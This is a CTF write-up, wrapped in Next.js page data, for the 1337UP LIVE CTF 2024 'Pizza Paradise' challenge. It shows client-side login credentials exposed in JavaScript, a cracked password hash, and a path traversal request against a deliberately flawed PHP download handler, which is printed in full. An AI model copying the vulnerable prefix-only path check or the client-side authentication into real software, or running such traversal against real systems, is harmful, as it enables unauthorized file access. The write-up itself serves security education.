@@ -1,0 +1,121 @@
+1:"$Sreact.fragment"
+2:I[87555,[],""]
+3:I[31295,[],""]
+4:I[6874,["874","static/chunks/874-c62c375efd21db20.js","319","static/chunks/app/writeups/layout-6eb8da7f54d57912.js"],""]
+6:I[59665,[],"MetadataBoundary"]
+8:I[59665,[],"OutletBoundary"]
+b:I[74911,[],"AsyncMetadataOutlet"]
+d:I[59665,[],"ViewportBoundary"]
+f:I[26614,[],""]
+:HL["/_next/static/media/a34f9d1faa5f3315-s.p.woff2","font",{"crossOrigin":"","type":"font/woff2"}]
+:HL["/_next/static/css/f67679a4dcf042a1.css","style"]
+0:{"P":null,"b":"LXc6w6ftcfUymS_FwiDab","p":"","c":["","writeups","91df12b57366ef5ab356fb09239eb4d8"],"i":false,"f":[[["",{"children":["writeups",{"children":[["id","91df12b57366ef5ab356fb09239eb4d8","d"],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",true],["",["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/f67679a4dcf042a1.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"className":"dark scroll-smooth","children":[["$","head",null,{"children":["$","meta",null,{"charSet":"utf-8"}]}],["$","body",null,{"className":"text-dark dark:text-white dark:bg-midnight","style":{"fontFamily":"'Inter', 'Inter Fallback'","fontStyle":"normal"},"children":["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[["$","div",null,{"className":"h-screen flex items-center justify-center","children":["$","main",null,{"className":"relative pl-14","children":[["$","svg",null,{"stroke":"currentColor","fill":"currentColor","strokeWidth":"0","viewBox":"0 0 512 512","className":"absolute left-0 top-2 text-5xl text-grapefruit","children":["$undefined",[["$","path","0",{"d":"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z","children":"$undefined"}]]],"style":{"color":"$undefined"},"height":"1em","width":"1em","xmlns":"http://www.w3.org/2000/svg"}],["$","h1",null,{"className":"font-bold text-7xl underline decoration-grapefruit mb-5","children":"404."}],["$","p",null,{"children":"Your requested page was not found."}],["$","$L4",null,{"href":"/","className":"font-medium text-inherit","children":"Return to home →"}]]}]}],[]],"forbidden":"$undefined","unauthorized":"$undefined"}]}]]}]]}],{"children":["writeups",["$","$1","c",{"children":[null,["$","main",null,{"className":"container pt-20 pb-24","children":[["$","$L4",null,{"href":"/","className":"text-secondary text-sm mb-10 -ml-5 block w-max","children":"← Back to home"}],["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}]]}],{"children":[["id","91df12b57366ef5ab356fb09239eb4d8","d"],["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":["__PAGE__",["$","$1","c",{"children":["$L5",["$","$L6",null,{"children":"$L7"}],null,["$","$L8",null,{"children":["$L9","$La",["$","$Lb",null,{"promise":"$@c"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],["$","$1","h",{"children":[null,["$","$1","LDzL2oMH_KMAGOcMcslXh",{"children":[["$","$Ld",null,{"children":"$Le"}],["$","meta",null,{"name":"next-size-adjust","content":""}]]}],null]}],false]],"m":"$undefined","G":["$f","$undefined"],"s":false,"S":true}
+10:"$Sreact.suspense"
+11:I[74911,[],"AsyncMetadata"]
+7:["$","$10",null,{"fallback":null,"children":["$","$L11",null,{"promise":"$@12"}]}]
+a:null
+e:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
+9:null
+12:{"metadata":[["$","title","0",{"children":"kevin.fish"}]],"error":null,"digest":"$undefined"}
+c:{"metadata":"$12:metadata","error":null,"digest":"$undefined"}
+13:I[50674,["325","static/chunks/325-8cc74193b249521f.js","134","static/chunks/app/writeups/%5Bid%5D/page-b6fc1eb85fdc5690.js"],"default"]
+14:T755,<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <title>Top Secret Government Access</title>
+        <link
+            href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap"
+            rel="stylesheet"
+        />
+        <link rel="stylesheet" href="/assets/css/secret-theme.css" />
+        <script src="/assets/js/auth.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+        <script>
+            function hashPassword(password) {
+                return CryptoJS.SHA256(password).toString();
+            }
+
+            function validate() {
+                const username = document.getElementById("username").value;
+                const password = document.getElementById("password").value;
+
+                const credentials = getCredentials();
+                const passwordHash = hashPassword(password);
+
+                if (
+                    username === credentials.username &&
+                    passwordHash === credentials.passwordHash
+                ) {
+                    return true;
+                } else {
+                    alert("Invalid credentials!");
+                    return false;
+                }
+            }
+        </script>
+    </head>
+    <body>
+        <div class="container">
+            <h1>Top Secret Government Access</h1>
+            <form id="loginForm" action="login.php" method="POST" onsubmit="return validate();">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" required /><br />
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required /><br />
+                <input type="submit" value="Login" />
+            </form>
+        </div>
+    </body>
+</html>15:T71a,<?php
+
+$flag = 'INTIGRITI{70p_53cr37_m15510n_c0mpl373}';
+
+if (isset($_GET['download'])) {
+    $file = $_GET['download'];
+    if (strpos($file, '/assets/images/') === 0) {
+        $filePath = __DIR__ . '/' . $file;
+        if (file_exists($filePath)) {
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
+            header('Content-Length: ' . filesize($filePath));
+            readfile($filePath);
+            exit();
+        } else {
+            die('File not found!');
+        }
+    } else {
+        die('File path not allowed!');
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Top Secret Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/assets/css/secret-theme.css">
+    <script src="/assets/js/displayImage.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome to the Top Secret Government Portal</h1>
+        <p>Authorized personnel only.</p>
+
+        <img id="selectedImage" src="/assets/images/topsecret1.png" alt="Selected Image">
+
+        <form method="GET" action="">
+            <label for="image">Select Image to Download:</label>
+            <select name="download" id="image" onchange="updateImage()">
+                <option value="/assets/images/topsecret1.png">Image 1</option>
+                <option value="/assets/images/topsecret2.png">Image 2</option>
+                <option value="/assets/images/topsecret3.png">Image 3</option>
+                <option value="/assets/images/topsecret4.png">Image 4</option>
+            </select>
+            <button type="submit">Download</button>
+        </form>
+    </div>
+</body>
+</html>5:["$","div",null,{"children":["$","main",null,{"className":"text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-3 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&>p>code]:bg-black/20 [&>p>code]:text-secondary [&>p>code]:px-2 [&>p>code]:py-1 [&>p>code]:rounded","children":[["$","h1","h1-0",{"children":"1337UP LIVE CTF 2024 — Pizza Paradise"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"Something weird going on at this pizza store!!"}],"\n",["$","p","p-1",{"children":"https://pizzaparadise.ctf.intigriti.io"}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a simple pizza chain website looking like this:"}],"\n",["$","p","p-1",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/c66ca812-f460-43d5-b7c1-238e0ef25457","alt":"image"}]}],"\n",["$","p","p-2",{"children":["Looking at the source code, CSS, and images, nothing seems out of the ordinary. However, going to ",["$","code","code-0",{"children":"robots.txt"}],","]}],"\n",["$","p","p-3",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/bd8a7188-6944-4b3f-893f-6492b8b1600a","alt":"image"}]}],"\n",["$","p","p-4",{"children":"Going to that suspicious route, we find a \"top secret\" login page looking like this:"}],"\n",["$","p","p-5",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/ba966615-b9e0-409e-b51a-3212475f77fa","alt":"image"}]}],"\n",["$","$L13","pre-0",{"className":"my-4","children":"$14","language":"html"}],"\n",["$","p","p-6",{"children":["Trying some simple SQL injection payloads, nothing happens. But looking at the ",["$","code","code-0",{"children":"validate()"}]," code, because validation is done on the client side, we can find the credentials we need to match in ",["$","code","code-1",{"children":"auth.js"}],":"]}],"\n",["$","$L13","pre-1",{"className":"my-4","children":"const validUsername = \"agent_1337\";\nconst validPasswordHash = \"91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac\";\n\nfunction getCredentials() {\n    return {\n        username: validUsername,\n        passwordHash: validPasswordHash,\n    };\n}","language":"js"}],"\n",["$","p","p-7",{"children":"But what's the unhashed version of the password? We can try some sketchy online hash-cracker lookup websites, and to my surprise,"}],"\n",["$","p","p-8",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/498744ae-2741-481a-93d7-ba5a786e61be","alt":"image"}]}],"\n",["$","p","p-9",{"children":"Then, we have our final credentials:"}],"\n",["$","$L13","pre-2",{"className":"my-4","children":"username: agent_1337\npassword: intel420","language":"$undefined"}],"\n",["$","p","p-10",{"children":"Logging in, we get to the \"top secret government portal\":"}],"\n",["$","p","p-11",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/71aff1bd-07cd-4283-ab93-9b7ebff7f426","alt":"image"}]}],"\n",["$","p","p-12",{"children":"We can download four AI-generated images, but nothing seems off about them either. The realization here is that this page reveals a special route for downloading files:"}],"\n",["$","p","p-13",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/ed9ab6a2-45fa-466c-93e7-623bf9cd6ae8","alt":"image"}]}],"\n",["$","p","p-14",{"children":["We can try to download other ",["$","code","code-0",{"children":"topsecretx.png"}]," images, but none exist. We can also notice that any path not beginning with ",["$","code","code-1",{"children":"/assets/images/"}]," fails with \"path not allowed\". Instead, we can finally apply path traversal to download the PHP handler for the admin portal endpoint,"]}],"\n",["$","p","p-15",{"children":"https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=/assets/images/../../topsecret_a9aedc6c39f654e55275ad8e65e316b3.php"}],"\n",["$","$L13","pre-3",{"className":"my-4","children":"$15","language":"php"}],"\n",["$","p","p-16",{"children":"getting us the flag."}]]}]}]
